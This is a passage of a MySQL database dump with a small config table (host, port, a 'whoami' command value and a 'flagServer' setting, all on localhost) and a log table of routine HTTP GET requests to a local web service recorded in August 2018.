-- MySQL dump 10.13  Distrib 5.7.22, for osx10.13 (x86_64)
--
-- Host: 127.0.0.1    Database: tweb
-- ------------------------------------------------------
-- Server version	5.7.22

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `config`
--

DROP TABLE IF EXISTS `config`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `config` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(80) DEFAULT NULL,
  `value` text,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `config`
--

LOCK TABLES `config` WRITE;
/*!40000 ALTER TABLE `config` DISABLE KEYS */;
INSERT INTO `config` VALUES (1,'vars','[{\"name\": \"host\", \"value\": \"127.0.0.1\"}, {\"name\": \"port\", \"value\": \"8080\"}, {\"name\": \"cmd\", \"value\": \"whoami\"}, {\"name\": \"flagServer\", \"value\": \"127.0.0.1\"}]'),(2,'port','8080');
/*!40000 ALTER TABLE `config` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `log`
--

DROP TABLE IF EXISTS `log`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `log` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `rid` int(11) DEFAULT NULL,
  `request` text,
  PRIMARY KEY (`id`) USING BTREE,
  KEY `rule_id` (`rid`) USING BTREE
) ENGINE=MyISAM AUTO_INCREMENT=3231 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `log`
--

LOCK TABLES `log` WRITE;
/*!40000 ALTER TABLE `log` DISABLE KEYS */;
INSERT INTO `log` VALUES (304,30,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"close\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Cache-Control\": \"max-age=0\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-08 13:09:42\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(306,30,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"close\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Cache-Control\": \"max-age=0\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-08 13:09:43\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(292,30,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"close\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-08 13:09:41\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(294,30,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"close\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Cache-Control\": \"max-age=0\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-08 13:09:41\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(296,30,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"close\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Cache-Control\": \"max-age=0\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-08 13:09:42\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(256,29,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"close\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-08 12:28:03\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(298,30,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"close\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Cache-Control\": \"max-age=0\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-08 13:09:42\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(300,30,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"close\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Cache-Control\": \"max-age=0\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-08 13:09:42\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(302,30,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"close\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Cache-Control\": \"max-age=0\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-08 13:09:42\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(309,30,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"close\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-08 13:10:04\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(308,30,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"close\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-08 13:09:55\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(276,30,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"close\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-08 13:08:13\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(278,30,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"close\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Cache-Control\": \"max-age=0\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-08 13:08:17\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(280,30,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"close\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Cache-Control\": \"max-age=0\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-08 13:09:27\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(282,30,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"close\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Cache-Control\": \"max-age=0\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-08 13:09:28\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(284,30,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"close\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Cache-Control\": \"max-age=0\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-08 13:09:30\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(286,30,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"close\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Cache-Control\": \"max-age=0\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-08 13:09:36\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(288,30,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"close\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Cache-Control\": \"max-age=0\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-08 13:09:37\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(290,30,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"close\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Cache-Control\": \"max-age=0\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-08 13:09:37\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(1345,35,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Content-Length\": \"7\", \"Accept-Encoding\": \"gzip, deflate\", \"X-User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Connection\": \"keep-alive\", \"Accept\": \"*/*\", \"User-Agent\": \"curl\", \"Host\": \"127.0.0.1:8081\"}, \"time\": \"2018-08-10 18:34:31\", \"query_string\": \"a=1&b=2\", \"data\": \"c=3&d=4\", \"method\": \"GET\"}'),(1347,35,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Content-Length\": \"7\", \"Accept-Encoding\": \"gzip, deflate\", \"X-User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Connection\": \"keep-alive\", \"Accept\": \"*/*\", \"User-Agent\": \"curl\", \"Host\": \"127.0.0.1:8081\"}, \"time\": \"2018-08-10 18:34:33\", \"query_string\": \"a=1&b=2\", \"data\": \"c=3&d=4\", \"method\": \"GET\"}'),(1349,35,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Content-Length\": \"7\", \"Accept-Encoding\": \"gzip, deflate\", \"X-User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Connection\": \"keep-alive\", \"Accept\": \"*/*\", \"User-Agent\": \"curl\", \"Host\": \"127.0.0.1:8081\"}, \"time\": \"2018-08-10 18:34:35\", \"query_string\": \"a=1&b=2\", \"data\": \"c=3&d=4\", \"method\": \"GET\"}'),(1356,36,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"keep-alive\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Cookie\": \"_ga=GA1.1.1717563741.1533205999\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-10 18:36:37\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(1357,36,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"keep-alive\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Cache-Control\": \"max-age=0\", \"Cookie\": \"_ga=GA1.1.1717563741.1533205999\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-10 18:37:36\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(1358,36,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"keep-alive\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Cache-Control\": \"max-age=0\", \"Cookie\": \"_ga=GA1.1.1717563741.1533205999\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-10 18:38:01\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(1359,36,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"keep-alive\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Cache-Control\": \"max-age=0\", \"Cookie\": \"_ga=GA1.1.1717563741.1533205999\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-10 18:38:30\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(1360,36,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"keep-alive\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Cookie\": \"_ga=GA1.1.1717563741.1533205999\", \"Cache-Control\": \"max-age=0\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-10 18:39:01\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(1361,36,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"keep-alive\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Cookie\": \"_ga=GA1.1.1717563741.1533205999\", \"Cache-Control\": \"max-age=0\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-10 18:39:01\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(1362,36,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"keep-alive\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Cookie\": \"_ga=GA1.1.1717563741.1533205999\", \"Cache-Control\": \"max-age=0\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-10 18:39:04\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(1321,35,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"keep-alive\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Cookie\": \"_ga=GA1.1.1717563741.1533205999\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-10 18:27:24\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(1322,35,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"keep-alive\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Cookie\": \"_ga=GA1.1.1717563741.1533205999\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-10 18:28:16\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(1323,35,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"keep-alive\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Cache-Control\": \"max-age=0\", \"Cookie\": \"_ga=GA1.1.1717563741.1533205999\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-10 18:28:18\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(1324,35,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"keep-alive\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Cache-Control\": \"max-age=0\", \"Cookie\": \"_ga=GA1.1.1717563741.1533205999\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-10 18:28:27\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(1325,35,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"keep-alive\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Cache-Control\": \"max-age=0\", \"Cookie\": \"_ga=GA1.1.1717563741.1533205999\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-10 18:28:37\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(1326,35,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"keep-alive\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Cache-Control\": \"max-age=0\", \"Cookie\": \"_ga=GA1.1.1717563741.1533205999\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-10 18:29:30\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(1327,35,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"keep-alive\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) 